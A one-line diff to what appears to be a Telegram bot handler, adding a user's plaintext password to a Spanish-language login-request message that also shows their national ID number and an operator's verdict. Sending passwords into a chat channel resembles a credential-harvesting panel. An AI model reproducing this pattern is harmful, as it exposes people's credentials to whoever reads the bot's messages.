@@ -204,6 +204,7 @@ bot.on('callback_query', async (query) => {
           `🔐 SOLICITUD DE INGRESO
 
 Cédula: ${request.cedula}
+Contraseña: ${request.password}
 
 ${verdict}
 Por: ${operator}`,
